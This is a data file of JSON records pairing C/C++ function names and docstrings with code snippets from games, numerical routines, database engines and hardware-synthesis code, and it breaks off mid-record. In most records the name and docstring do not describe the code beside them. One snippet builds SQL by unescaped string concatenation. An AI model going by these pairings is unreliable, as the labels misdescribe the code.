{"content":"{'function_name': 'grow_piece', 'docstring': '\/\/ See if piece dies after growing!', 'code': \"bool any_enemies_around_piece(int tx, int ty)\\n{\\n\\tint x1, y1, x2, y2, x, y;\\n\\n\\t\/\/ Clip search so we don't go outside map.\\n\\tx1 = MAX(0, tx - 1);\\n\\ty1 = MAX(0, ty - 1);\\n\\tx2 = MIN(MAX_BOARD_WIDTH, tx + 1);\\n\\ty2 = MIN(MAX_BOARD_HEIGHT, ty + 1);\\n\\n\\tfor (y = y1 ; y <= y2 ; y++)\\n\\t{\\n\\t\\tfor (x = x1 ; x <= x2 ; x++)\\n\\t\\t{\\n\\t\\t\\tif (board[x][y][PIECE].gfx == BLANK) continue;\\n\\n\\t\\t\\t\/\/ Does this piece belong to another wizard? And can this piece attack or grow?\\n\\t\\t\\tif (!is_piece_friendly(x, y, PIECE) && (board[x][y][PIECE].combat > 0 ||\\n\\t\\t\\t\\t(board[x][y][PIECE].grow_chance > 0 && board[x][y][PIECE].defence > 0))) return true; \\n\\t\\t}    \\n\\t}\\n\\n\\treturn false;\\n}\"}","id":276}
{"content":"{'function_name': 'dynamicDz', 'docstring': '\/\/\\tprintf(\" _Xv = %0.2f _Yv = %0.2f\\\\n\", Xk, Yk);\\t\\t\\t', 'code': 'int dynamicDzTz(double F, double L, double Xn, double Yn, double Kn, double Vn, double Vmax, double a, float Tz, double Dz, double Rc, double Xc, double Yc, double Kc, double Vc,\\n\\t\\t  double* Fn, double* Ln, double* Fk, double* Lk, double* Fv, double* Lv, double* Fc, double* Lc, double* Kk, double* Vk, double* tm, double* tc, double* tpt)\\n{\\n\\t\/\/\u041f\u043e\u0441\u0447\u0438\u0442\u0430\u0435\u043c \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b \u0432\u044b\u0445\u043e\u0434\u0430 \u0431\u0435\u0437 \u0446\u0438\u0440\u043a\u0443\u043b\u044f\u0446\u0438\u0438\\n\\tint result = 0;\\n\\tdouble Vcx, Vcy;\\t\/\/\u0421\u043e\u0441\u0442\u0430\u0432\u043b\u044f\u044e\u0449\u0438\u0435 \u0441\u0441\u043a\u043e\u0440\u043e\u0441\u0442\u0438 \u0446\u0435\u043b\u0438\\n\\tdouble Km, Vm;\\t\\t\/\/\u041a\u0443\u0440\u0441 \u0438 \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u044c \u043c\u0430\u043d\u0435\u0432\u0440\u0430 \u0431\u0435\u0437 \u0446\u0438\u0440\u043a\u0443\u043b\u044f\u0446\u0438\u0438\\n\\tpdinxy(Kc, Vc, &Vcx, &Vcy);\\n\\tresult = sblDzTz(Xc, Yc, Vcx, Vcy, Dz, Vmax, Tz, &Km, &Vm);\\n\/\/\\tprintf(\"____ res1 = %d\\\\n\", result);\\n\\tif (result == 0) return 0;\\n\\t\\n\\tdouble dV = 0.1;\\t\/\/ \u041d\u0430\u0447\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0434\u0435\u043b\u044c\u0442\u0430 \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u0438\\n\\tdouble Tr = Tz;\\t\/\/ \u041f\u0440\u043e\u043c\u0435\u0436\u0443\u0442\u043e\u0447\u043d\u043e\u0435 \u0432\u0440\u0435\u043c\u044f \u0441\u0431\u043b\u0438\u0436\u0435\u043d\u0438\u044f\\n\\tint i = 0;\\n\\tdouble _Vm;\\n\\tdo\\n\\t{\\n\\t\\tprintf(\"____ Vm = %0.3f\\\\n\", Vm);\\n\\t\\tresult = dynamicDz(F, L, Xn, Yn, Kn, Vn, Vm, a, Dz, Rc, Xc, Yc, Kc, Vc,\\n\\t\\t\\t  Kk, tm, Fn, Ln, Fk, Lk, Fv, Lv, Fc, Lc, tc, tpt);\\n\/\/\\t\\tprintf(\"____ res2 = %d\\\\n\", result);\\n\\t\\t\/\/if (result == 0) return 0;\\n\\t\\tTr = *tm;\\n\\t\\tif (Tz>Tr && result == 1) \\n\\t\\t{\\n\\t\\t\\tif (dV>0) dV \/=2;\\n\\t\\t\\tdV = -1*ABS(dV);\\n\\t\\t\\tVm += dV;\\n\\t\\t\\t\\n\\t\\t\\t\\n\\t\\t} else \\n\\t\\t{\\n\\t\\t\\tif (dV<0) dV \/=2;\\t\\t\\t\\n\\t\\t\\tdV = ABS(dV);\\n\\t\\t\\tVm +=dV;\\n\\t\\t} \\n\\t\\tprintf(\"___ %d ____ Tz = %.1f; Tr = %.1f; dT = %.1f\\\\n\", i, Tz, Tr, ABS(Tz-Tr));\\n\\t\\ti++;\\n\\t} while (ABS(Tz-Tr)>1.0 && i<1000);\\n\\tif (result == 0) return 0;\\n\\tif (i == 1000) return 0;\\n\\t*Vk = Vm;\\n\\treturn 1;\\n}'}","id":278}
{"content":"{'function_name': 'FilterTempFile', 'docstring': '\/\/\u67e5\u8be2\u6587\u4ef6\u540d\u5f53\u4e2d\u662f\u5426\u5305\u542bpstrFileName', 'code': 'static std::string BinaryHashToHexString(const unsigned char *hash, int len)\\n{\\n\\tstd::string out;\\n\\t\\n\\t\/\/ reverse enough space to gain a little speedup\\n\\tout.reserve(len * 2 + 1);  \\n\\tfor (int i = 0; i < len; ++i)\\n\\t\\tout += D_NumFmt(\"%02x\", (int)hash[i]).c_str();\\n\\treturn out;\\n}'}","id":282}
{"content":"{'function_name': 'GetArcContainerLifetimeEvent', 'docstring': '\/\/ be paired up to one non-START event.', 'code': 'bool IsRequestAllowed(const absl::optional<ArcInstanceMode>& current_mode,\\n                      ArcInstanceMode request_mode) {\\n  if (!current_mode.has_value()) {\\n    \/\/ This is a request to start a new ARC instance (either mini instance\\n    \/\/ or full instance).\\n    return true;\\n  }\\n\\n  if (current_mode == ArcInstanceMode::MINI_INSTANCE &&\\n      request_mode == ArcInstanceMode::FULL_INSTANCE) {\\n    \/\/ This is a request to upgrade the running mini instance to full instance.\\n    return true;\\n  }\\n\\n  \/\/ Otherwise, not allowed.\\n  LOG(ERROR) << \"Unexpected ARC instance mode transition request: \"\\n             << current_mode << \" -> \" << request_mode;\\n  return false;\\n}'}","id":284}
{"content":"{'function_name': 'make_json', 'docstring': '\/\/ std::cout << json.to_string() << std::endl;', 'code': 'json_type make_json3() {\\n    \\n    \\n    \\n        json_type vec1(amo::json_value_array);\\n        \/*vec1.push_back(\"1\");\\n        vec1.push_back(\"2\");\\n        vec1.push_back(\"3\");\\n        *\/\\n        \\n        json_type vec2(amo::json_value_array);\\n        \/*vec2.push_back(4);\\n        vec2.push_back(5);\\n        vec2.push_back(6);*\/\\n        \\n        json_type vec3(amo::json_value_array);\\n        \\n        {\\n            json_type arr3(amo::json_value_array);\\n            \/*arr3.push_back(7);\\n            arr3.push_back(8);\\n            arr3.push_back(9);*\/\\n            \\n            vec3.push_back(arr3);\\n            vec3.push_back(arr3);\\n            vec3.push_back(arr3);\\n        }\\n        \\n        \\n        json_type json;\\n        \/*\\tjson.put(\"vec1\", vec1);\\n        \\tjson.put(\"vec2\", vec2);\\n        \\tjson.put(\"vec3\", vec3);*\/\\n        ;\\n        \\n        json_type info;\\n        \/\/info.put(\"m_bool\", true);\\n        \/\/\/\/info.put(\"m_char\", \\'c\\');\\n        \/\/info.put(\"m_int8_t\", 8);\\n        \/\/info.put(\"m_int16_t\", 16);\\n        \/\/info.put(\"m_int32_t\", 32);\\n        \/\/info.put(\"m_int64_t\", 64);\\n        \/\/info.put(\"m_uint8_t\", 8u);\\n        \/\/info.put(\"m_uint16_t\", 16u);\\n        \/\/info.put(\"m_uint32_t\", 32u);\\n        \/\/info.put(\"m_uin64_t\", 64u);\\n        \/\/info.put(\"m_float\", 1.0);\\n        \/\/info.put(\"m_double\", 2.22);\\n        \/\/info.put(\"m_string\", \"string txt\");\\n        \\n        json.put(\"m_jsoninfo2\", info);\\n        json.put(\"m_jsoninfo3\", info);\\n        \\n        \\n        json_type jsoninfoclass;\\n        jsoninfoclass.put(\"m_jsoninfo1\", info);\\n        jsoninfoclass.put(\"m_jsoninfo2\", info);\\n        \\n        json.put(\"m_jsoninfo2\", jsoninfoclass);\\n        json.put(\"m_jsoninfo3\", jsoninfoclass);\\n        \\n        json_type arr(amo::json_value_array);\\n        arr.push_back(jsoninfoclass);\\n        arr.push_back(jsoninfoclass);\\n        arr.push_back(jsoninfoclass);\\n        arr.push_back(jsoninfoclass);\\n        \\n        json.put(\"m_jsoninfo4\", arr);\\n        json.put(\"m_jsoninfo5\", arr);\\n        \\n        json_type arr2(amo::json_value_array);\\n        arr2.push_back(arr);\\n        arr2.push_back(arr);\\n        arr2.push_back(arr);\\n        json.put(\"m_jsoninfo6\", arr2);\\n        \\n        return json;\\n    }'}","id":293}
{"content":"{'function_name': 'InitList', 'docstring': '\/\/ for now link list is null,the cursor of last element is 0', 'code': 'int Malloc_SSL(StaticLinkList space)\\n{\\n\\t\/\/ Get index of free element\\n\\tint i = space[0].cur;\\n\\n\\tif (space[0].cur)\\n\\t\\t\/\/ Use next element als alternate element\\n\\t\\tspace[0].cur = space[i].cur;\\n\\n\\treturn i;\\n}'}","id":294}
{"content":"{'function_name': 'display', 'docstring': '\/\/glutSolidTorus(5.0f, 10.0f, 40, 40);', 'code': 'void idle() {\\n    float t, desiredFrameTime, frameTime;\\n    static float tLast = 0.0;\\n\\n    \/\/ Get elapsed time\\n    t = glutGet(GLUT_ELAPSED_TIME);\\n    \/\/ convert milliseconds to seconds\\n    t \/= 1000.0;\\n\\n    \/\/ Calculate frame time\\n    frameTime = t - tLast;\\n    \/\/ Calculate desired frame time\\n    desiredFrameTime = 1.0 \/ (float) (60);\\n\\n    \/\/ Check if the desired frame time was achieved. If not, skip animation.\\n    if (frameTime <= desiredFrameTime)\\n        return;\\n\\n    for (int i = 0; i < 2; ++i) {\\n        if (position[i] == positionTransition[i]) continue;\\n        int direction = getSignal(position[i] - positionTransition[i]);\\n        positionTransition[i] += direction * speed;\\n        if (direction != getSignal(position[i] - positionTransition[i]))\\n            positionTransition[i] = position[i];\\n\\n    }\\n\\n    glutPostRedisplay();\\n}'}","id":297}
{"content":"{'function_name': 'stepInNeighbourhood', 'docstring': '\/\/ Explore the neighbourhood and return the firstly found better option', 'code': 'int localSearch(solution &sol_bits, int MAX_EVALUATIONS) {\\n  int tam_sol_bits = sol_bits.v.size();\\n  solution_int sol;\\n  bool stop = false;\\n  int evaluations = 0;\\n\\n  BitsToInt(sol_bits, sol);\\n  updateSolution(sol);\\n\\n  while (!stop && evaluations < MAX_EVALUATIONS) {\\n    stop = stepInNeighbourhood(sol, evaluations, MAX_EVALUATIONS-evaluations);\\n    \/\/ cout << sol.fitness << \"\\\\t\" << iterations << endl;\\n  }\\n\\n  \/\/ output: Fitness - Time - Iterations\\n  \/\/ cout << sol.fitness << \"\\\\t\" << (double) t_total \/ CLOCKS_PER_SEC << \"\\\\t\" << iterations<< endl;\\n  IntToBits(sol, sol_bits, tam_sol_bits);\\n  return evaluations;\\n}'}","id":303}
{"content":"{'function_name': 'bfs', 'docstring': \"\/\/root's 2^0 father is root\", 'code': \"int LCA(int u, int v)\\n{\\n\\tif (dis[u] > dis[v])swap(u, v);\\n\\tint du = dis[u], dv = dis[v];\\n\\tint tu = u, tv = v;\\n\\tfor (int det = dv - du, i = 0;det; det>>=1, i++)\\n\\t\\tif (det&1)\/\/det if u's high - v's high;\\n\\t\\ttv = fa[tv][i];\/\/let deeper point up(2^i) until det = 1;\\n\\tif (tu == tv)return tu;\\n\\tfor (int i = DEG - 1; i >= 0; i--)\\n\\t{\\n\\t\\tif (fa[tu][i] == fa[tv][i])continue;\\n\\t\\ttu = fa[tu][i];\\n\\t\\ttv = fa[tv][i];\\n\\t}\\n\\treturn fa[tu][0];\\n}\"}","id":306}
{"content":"{'function_name': 'dfs2', 'docstring': '\/\/ climb ', 'code': 'int maxFruit(vector<int> tree[], \\n\\t\\t\\tint NodesWithFruits[], \\n\\t\\t\\tint n, int m, int k) \\n{ \\n\\t\/\/ reseting dp table and Fruit array \\n\\tfor (int i = 0; i < N; i++) { \\n\\t\\tfor (int j = 0; j < 20; j++) \\n\\t\\t\\tdp[i][j] = -1; \\n\\t\\tFruit[i] = 0; \\n\\t} \\n\\t\\n\\t\/\/ This array is used to mark \\n\\t\/\/ which nodes contain Fruits \\n\\tfor (int i = 0; i < m; i++) \\n\\t\\tFruit[NodesWithFruits[i]] = 1; \\n\\t\\n\\tdfs1(tree, 1, 0, 0); \\n\\tint ans = dfs2(tree, 1, 0, 0, k); \\n\\t\\n\\treturn ans; \\n}'}","id":312}
{"content":"{'function_name': 'scalar_add', 'docstring': '\/\/ generic, this still optimizes correctly on MSVC.', 'code': \"bool large_add_from(stackvec<size>& x, limb_span y, size_t start) noexcept {\\n  \/\/ the effective x buffer is from `xstart..x.len()`, so exit early\\n  \/\/ if we can't get that current range.\\n  if (x.len() < start || y.len() > x.len() - start) {\\n      FASTFLOAT_TRY(x.try_resize(y.len() + start, 0));\\n  }\\n\\n  bool carry = false;\\n  for (size_t index = 0; index < y.len(); index++) {\\n    limb xi = x[index + start];\\n    limb yi = y[index];\\n    bool c1 = false;\\n    bool c2 = false;\\n    xi = scalar_add(xi, yi, c1);\\n    if (carry) {\\n      xi = scalar_add(xi, 1, c2);\\n    }\\n    x[index + start] = xi;\\n    carry = c1 | c2;\\n  }\\n\\n  \/\/ handle overflow\\n  if (carry) {\\n    FASTFLOAT_TRY(small_add_from(x, 1, y.len() + start));\\n  }\\n  return true;\\n}\"}","id":316}
{"content":"{'function_name': 'getFire', 'docstring': '\/\/Return where to fire.', 'code': \"string getname(void){\\t\/\/Returns the player's name\\n\\treturn name;\\n}\"}","id":319}
{"content":"{'function_name': 'ErrDBInitDatabase', 'docstring': '\/\/', 'code': 'VOID DBReportTachmentEvent( const INST * const pinst, const IFMP ifmp, const MessageId msgidTachment, PCWSTR wszDatabaseName, const BOOL fCacheAlive = fFalse, const BOOL fDirtyCacheAlive = fFalse )\\n{\\n    FMP * pfmp = &g_rgfmp[ifmp];\\n\\n    Assert( pinst );\\n    Assert( pfmp );\\n    Assert( msgidTachment );\\n    Assert( wszDatabaseName );\\n\\n    if ( pfmp->FIsTempDB() )\\n    {\\n        \/\/  we don\\'t log the temp DB attach\/detach\\n        return;\\n    }\\n\\n    \/\/ report our successful {create|attach|detach} and timings\\n\\n    WCHAR wszSeconds[16];\\n    WCHAR wszFmpId[16];\\n    WCHAR wszKeepCacheAlive[24];\\n    WCHAR wszAddlFixedData[250];\\n\\n    __int64 usecTach = 0;\\n    ULONG cbTimingResourceDataSequence = 0;\\n    WCHAR * wszTimingResourceDataSequence = NULL;\\n    CIsamSequenceDiagLog * pisdl = NULL;\\n    switch( msgidTachment )\\n    {\\n        case CREATE_DATABASE_DONE_ID:\\n            pisdl = &pfmp->m_isdlCreate;\\n            Assert( pisdl->EFinalStep() == eCreateDone );\\n            break;\\n        case ATTACH_DATABASE_DONE_ID:\\n            pisdl = &pfmp->m_isdlAttach;\\n            Assert( pisdl->EFinalStep() == eAttachDone );\\n            break;\\n        case DETACH_DATABASE_DONE_ID:\\n            pisdl = &pfmp->m_isdlDetach;\\n            Assert( pisdl->EFinalStep() == eDetachDone );\\n            break;\\n        default:\\n            AssertSz( fFalse, \"Unknown msgid = %d for *tachment event!\", msgidTachment );\\n    }\\n    if ( pisdl )\\n    {\\n        usecTach = pisdl->UsecTimer( eSequenceStart, pisdl->EFinalStep() );\\n        cbTimingResourceDataSequence = pisdl->CbSprintTimings();\\n        wszTimingResourceDataSequence = (WCHAR *)_alloca( cbTimingResourceDataSequence );\\n        pisdl->SprintTimings( wszTimingResourceDataSequence, cbTimingResourceDataSequence );\\n        pisdl->SprintFixedData( wszAddlFixedData, sizeof(wszAddlFixedData) );\\n        pisdl->TermSequence();\\n    }\\n\\n    if ( msgidTachment == CREATE_DATABASE_DONE_ID || msgidTachment == ATTACH_DATABASE_DONE_ID )\\n    {\\n        INT ich = wcslen( wszAddlFixedData );\\n        OSStrCbFormatW( wszAddlFixedData + ich, _cbrg( wszAddlFixedData ) - ich * sizeof(WCHAR), L\",\\\\ndbv = \" );\\n        ich = wcslen( wszAddlFixedData );\\n        FormatDbvEfvMapping( ifmp, wszAddlFixedData + ich, _cbrg( wszAddlFixedData ) - ich * sizeof(WCHAR) );\\n    }\\n\\n    \/\/  We might consider truncating the timing sequence data when usecTach < 100000 \/* 100 ms *\/, or\\n    \/\/  even skipping the whole event altogether.  Probably good to make this behavior based upon the\\n    \/\/  event logging level.\\n\\n    OSStrCbFormatW( wszSeconds, sizeof(wszSeconds), L\"%I64d\", usecTach \/ 1000000 \/* convert to seconds *\/ );\\n    OSStrCbFormatW( wszFmpId, sizeof(wszFmpId), L\"%d\", (ULONG)ifmp );\\n    OSStrCbFormatW( wszKeepCacheAlive, sizeof(wszKeepCacheAlive), L\"%d %d\", fCacheAlive, fDirtyCacheAlive );\\n\\n    const WCHAR * rgszT[6] = { wszFmpId, wszDatabaseName, wszSeconds, wszTimingResourceDataSequence, wszKeepCacheAlive, wszAddlFixedData };\\n\\n    UtilReportEvent(\\n        eventInformation,\\n        GENERAL_CATEGORY,\\n        msgidTachment,\\n        _countof( rgszT ),\\n        rgszT,\\n        0,\\n        NULL,\\n        pinst );\\n}'}","id":323}
{"content":"{'function_name': 'Java_nimbus_nativestructs_CSet_delete', 'docstring': '\/\/ delete the actual set', 'code': \"JNIEXPORT jint JNICALL Java_nimbus_nativestructs_CSet_c_1iterInit(JNIEnv *, jobject, jint si)\\n{\\t\\n\\tsettype* set = csetSetFactory.Get(si);\\n\\n\\t\/\/ create a new iterator for this set\\n\\tsetconstiter* pIter = new setconstiter(set->begin());\\n\\t\\n\\t\/\/ check whether or not we have created an iterator for this map before\\n\\tIndexedIterMapType* indexedIters = 0;\\n\\tSetToItersMapConstIter iter = setToIterMap.find(si);\\n\\tif (iter != setToIterMap.end())\\n\\t{\\n\\t\\t\/\/ if we have, then we will want to add a new set const iter with a new index\\n\\t\\tindexedIters = iter->second;\\n\\t}\\n\\telse\\n\\t{\\n\\t\\t\/\/ if we haven't yet, we will need to make a new map for the indexed iterators and add it to the map\\n\\t\\tindexedIters = new IndexedIterMapType();\\n\\t\\tsetToIterMap.insert(std::pair<int, IndexedIterMapType*>(si, indexedIters));\\n\\t}\\n\\t\\n\\tint newIndex = indexedIters->size();\\n\\tindexedIters->insert(std::pair<int, setconstiter*>(newIndex, pIter));\\n\\treturn newIndex;\\n}\"}","id":324}
{"content":"{'function_name': 'parse_eight_digits_unrolled', 'docstring': '\/\/ val = (val * 2561) >> 8;', 'code': 'fastfloat_really_inline void round(adjusted_mantissa& am, callback cb) noexcept {\\n  int32_t mantissa_shift = 64 - binary_format<T>::mantissa_explicit_bits() - 1;\\n  if (-am.power2 >= mantissa_shift) {\\n    \/\/ have a denormal float\\n    int32_t shift = -am.power2 + 1;\\n    cb(am, std::min<int32_t>(shift, 64));\\n    \/\/ check for round-up: if rounding-nearest carried us to the hidden bit.\\n    am.power2 = (am.mantissa < (uint64_t(1) << binary_format<T>::mantissa_explicit_bits())) ? 0 : 1;\\n    return;\\n  }\\n\\n  \/\/ have a normal float, use the default shift.\\n  cb(am, mantissa_shift);\\n\\n  \/\/ check for carry\\n  if (am.mantissa >= (uint64_t(2) << binary_format<T>::mantissa_explicit_bits())) {\\n    am.mantissa = (uint64_t(1) << binary_format<T>::mantissa_explicit_bits());\\n    am.power2++;\\n  }\\n\\n  \/\/ check for infinite: we could have carried to an infinite power\\n  am.mantissa &= ~(uint64_t(1) << binary_format<T>::mantissa_explicit_bits());\\n  if (am.power2 >= binary_format<T>::infinite_power()) {\\n    am.power2 = binary_format<T>::infinite_power();\\n    am.mantissa = 0;\\n  }\\n}'}","id":328}
{"content":"{'function_name': 'demosaic_byb_rd1_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaic_byb_rd2_select(demosaic_bx_cache& demosaic_bx, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaic_byb_rd2 read pattern: { demosaic_byb_update_0[d0, d1] -> demosaic_bx[2d0, 2 + d1] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Read schedule : { demosaic_byb_update_0[d0, d1] -> [5 + d1, 3 + d0, 8] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Write schedule: { demosaic_bx_update_0[d0, d1] -> [3 + d1, 3 + d0, 7] : 0 <= d0 <= 959 and 0 <= d1 <= 1081 }\\n  \/\/ DD fold: {  }\\n  auto value_demosaic_bx_demosaic_bx_update_0_write0 = demosaic_bx.demosaic_bx_demosaic_bx_update_0_write0_merged_banks_3.peek_0();\\n  return value_demosaic_bx_demosaic_bx_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":329}
{"content":"{'function_name': 'PyUIBounds', 'docstring': '\/\/ current (which can be bigger).', 'code': 'static auto PyShowAd(PyObject* self, PyObject* args, PyObject* keywds)\\n    -> PyObject* {\\n  BA_PYTHON_TRY;\\n  BA_PRECONDITION(g_base->InLogicThread());\\n  const char* purpose;\\n  PyObject* on_completion_call_obj = Py_None;\\n  int pass_actually_showed = false;\\n  static const char* kwlist[] = {\"purpose\", \"on_completion_call\", nullptr};\\n  if (!PyArg_ParseTupleAndKeywords(\\n          args, keywds, \"s|O\", const_cast<char**>(kwlist), &purpose,\\n          &on_completion_call_obj, &pass_actually_showed)) {\\n    return nullptr;\\n  }\\n  g_base->plus()->SetAdCompletionCall(on_completion_call_obj,\\n                                      static_cast<bool>(pass_actually_showed));\\n\\n  \/\/ In cases where we support ads, store our callback and kick one off.\\n  \/\/ We\\'ll then fire our callback once its done.\\n  \/\/ If we *don\\'t* support ads, just store our callback and then kick off\\n  \/\/ an ad-view-complete message ourself so the event flow is similar..\\n  if (g_core->platform->GetHasAds()) {\\n    g_core->platform->ShowAd(purpose);\\n  } else {\\n    g_base->plus()->PushAdViewComplete(purpose, false);\\n  }\\n  Py_RETURN_NONE;\\n  BA_PYTHON_CATCH;\\n}'}","id":338}
{"content":"{'function_name': 'jacobian3D_sums', 'docstring': '\/\/then the other entries', 'code': 'double objectivefunc2D(unsigned n, const double *x, double *grad, void *dd)\\n{\\n    double ans;\\n    data_info d = *((struct data_info *)dd); \\n    create_full_rep(d.cycle_size, d.ndim, d._cycle_rep, d.start, d.x_size\/d.ndim, x, d.rep);\\n    create_metric_tensor2D(d.ndim, x, d.Z);\\n    ans = compute_inner_product_fast2D(x, d);\\n    if (grad) {\\n        \/\/Jacobian calc not working!!\\n        \/\/jacobian3D_sums(grad, x, d);\\n        \/\/forward_difference_grad(grad, x, ans, dd, 1e-5);\\n        central_difference_grad2D(grad, x, dd, 1e-5);\\n    }\\n    \/\/std::cout<<ans<<std::endl;\\n    return ans; \\n}'}","id":340}
{"content":"{'function_name': 'split_roots', 'docstring': '\/\/ f = f(-x) or -f(-x)', 'code': 'void cycle_tuples(vector< vector<size_t> > &res, const vector<size_t> &perm) {\\n  const size_t &n = perm.size();\\n  res.resize(0);\\n  vector<bool> seen(n, false);\\n  for(size_t i = 0; i < n; ++i) {\\n    if( not seen[i] ) {\\n      if(perm[i] == i) {\\n        res.push_back(vector<size_t>(1, i));\\n        seen[i] = true;\\n      } else {\\n        vector<size_t> cycle(1, i);\\n        size_t k = perm[i];\\n        while( k != i ) {\\n          cycle.push_back(k);\\n          seen[k] = true;\\n          k = perm[k];\\n        }\\n        res.push_back(cycle);\\n      }\\n    }\\n  }\\n  \/\/ sort using the length of the cycles\\n  sort(res.begin(),\\n      res.end(),\\n      [](const vector<size_t> &a, const vector<size_t> &b) {\\n      return a.size() > b.size();\\n      });\\n}'}","id":348}
{"content":"{'function_name': 'getOrderKey', 'docstring': '\/\/ o_id,o_d_id,o_w_id', 'code': 'int64_t getOrderKey2 (char *row_order) {  \/\/ o_d_id,o_w_id,o_c_id\\n    int64_t key = *(int64_t*)(row_order+2*sizeof(int64_t))-1;\\n    key += getDistrictKey(row_order)*CUSTOMER_PER_DISTRICT;\\n    return key;\\n}'}","id":353}
{"content":"{'function_name': 'init_system_matrix_toyexample', 'docstring': '\/\/ central elements', 'code': 'NumericVector numerical_solution_toyexample(NumericVector param, int nx)\\n{\\n    int nml = compute_matrix_dimension_toyexample(nx);\\n    NumericVector x(nx);\\n    NumericVector b(nx);\\n    NumericMatrix mle(nml, 3);\\n\\n    mle = init_system_matrix_toyexample(param, nx);\\n    b = init_right_part_toyexample(param, nx);\\n    x = linear_solver_toyexample(mle, b);\\n    \/\/x = linear_solver_direct_toyexample(mle, b);\\n    return x;\\n}'}","id":354}
{"content":"{'function_name': 'CDC_Init_FS', 'docstring': '\/* USER CODE END 3 *\/', 'code': 'static int8_t CDC_DeInit_FS(void)\\r\\n{\\r\\n    \/* USER CODE BEGIN 4 *\/\\r\\n    return (USBD_OK);\\r\\n    \/* USER CODE END 4 *\/\\r\\n}'}","id":366}
{"content":"{'function_name': 'insert_fieldtest', 'docstring': '\/\/      cout << \"inside databasefunc::insert_fieldtest()\" << endl;', 'code': 'string generate_insert_fieldtest_SQL_command(\\n      string fieldtest_date,string brief_label,string description)\\n   {\\n\/\/   cout << \"inside databasefunc::generate_fieldtest_SQL_command()\" << endl;\\n\\n      string SQL_command=\"insert into fieldtests \";\\n      SQL_command += \"(start_time_stamp,description,label) \";\\n      SQL_command += \"values( \";\\n      SQL_command += \"\\'\"+fieldtest_date+\"\\',\";\\n      SQL_command += \"\\'\"+description+\"\\',\";\\n      SQL_command += \"\\'\"+brief_label+\"\\'\";\\n      SQL_command += \");\";\\n\\n      cout << SQL_command << endl;\\n      return SQL_command;\\n   }'}","id":369}
{"content":"{'function_name': 'upcall_flush_chan', 'docstring': '\/\/ Nop.', 'code': 'CDECL void\\nupcall_recv(rust_task *task, uintptr_t *dptr, rust_port *port) {\\n    LOG_UPCALL_ENTRY(task);\\n    task->log(rust_log::UPCALL | rust_log::COMM,\\n              \"port: 0x%\" PRIxPTR \", dptr: 0x%\" PRIxPTR\\n              \", size: 0x%\" PRIxPTR \", chan_no: %d\",\\n              (uintptr_t) port, (uintptr_t) dptr, port->unit_sz,\\n              port->chans.length());\\n\\n    if (port->receive(dptr)) {\\n        return;\\n    }\\n\\n    \/\/ No data was buffered on any incoming channel, so block this task\\n    \/\/ on the port. Remember the rendezvous location so that any sender\\n    \/\/ task can write to it before waking up this task.\\n\\n    task->log(rust_log::COMM, \"<=== waiting for rendezvous data ===\");\\n    task->rendezvous_ptr = dptr;\\n    task->block(port, \"waiting for rendezvous data\");\\n    task->yield(3);\\n}'}","id":381}
{"content":"{'function_name': 'demosaicb_rd9_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<288> denoise_demosaicb_update_0_read_bundle_read(denoise_cache& denoise, int d0, int d1) {\\n  \/\/ # of ports in bundle: 18\\n    \/\/ demosaicb_rd0\\n    \/\/ demosaicb_rd1\\n    \/\/ demosaicb_rd2\\n    \/\/ demosaicb_rd3\\n    \/\/ demosaicb_rd4\\n    \/\/ demosaicb_rd5\\n    \/\/ demosaicb_rd6\\n    \/\/ demosaicb_rd7\\n    \/\/ demosaicb_rd8\\n    \/\/ demosaicb_rd9\\n    \/\/ demosaicb_rd10\\n    \/\/ demosaicb_rd11\\n    \/\/ demosaicb_rd12\\n    \/\/ demosaicb_rd13\\n    \/\/ demosaicb_rd14\\n    \/\/ demosaicb_rd15\\n    \/\/ demosaicb_rd16\\n    \/\/ demosaicb_rd17\\n\\n\\thw_uint<288> result;\\n\\thw_uint<16> demosaicb_rd0_res = demosaicb_rd0_select(denoise, d0, d1);\\n\\tset_at<0, 288>(result, demosaicb_rd0_res);\\n\\thw_uint<16> demosaicb_rd1_res = demosaicb_rd1_select(denoise, d0, d1);\\n\\tset_at<16, 288>(result, demosaicb_rd1_res);\\n\\thw_uint<16> demosaicb_rd2_res = demosaicb_rd2_select(denoise, d0, d1);\\n\\tset_at<32, 288>(result, demosaicb_rd2_res);\\n\\thw_uint<16> demosaicb_rd3_res = demosaicb_rd3_select(denoise, d0, d1);\\n\\tset_at<48, 288>(result, demosaicb_rd3_res);\\n\\thw_uint<16> demosaicb_rd4_res = demosaicb_rd4_select(denoise, d0, d1);\\n\\tset_at<64, 288>(result, demosaicb_rd4_res);\\n\\thw_uint<16> demosaicb_rd5_res = demosaicb_rd5_select(denoise, d0, d1);\\n\\tset_at<80, 288>(result, demosaicb_rd5_res);\\n\\thw_uint<16> demosaicb_rd6_res = demosaicb_rd6_select(denoise, d0, d1);\\n\\tset_at<96, 288>(result, demosaicb_rd6_res);\\n\\thw_uint<16> demosaicb_rd7_res = demosaicb_rd7_select(denoise, d0, d1);\\n\\tset_at<112, 288>(result, demosaicb_rd7_res);\\n\\thw_uint<16> demosaicb_rd8_res = demosaicb_rd8_select(denoise, d0, d1);\\n\\tset_at<128, 288>(result, demosaicb_rd8_res);\\n\\thw_uint<16> demosaicb_rd9_res = demosaicb_rd9_select(denoise, d0, d1);\\n\\tset_at<144, 288>(result, demosaicb_rd9_res);\\n\\thw_uint<16> demosaicb_rd10_res = demosaicb_rd10_select(denoise, d0, d1);\\n\\tset_at<160, 288>(result, demosaicb_rd10_res);\\n\\thw_uint<16> demosaicb_rd11_res = demosaicb_rd11_select(denoise, d0, d1);\\n\\tset_at<176, 288>(result, demosaicb_rd11_res);\\n\\thw_uint<16> demosaicb_rd12_res = demosaicb_rd12_select(denoise, d0, 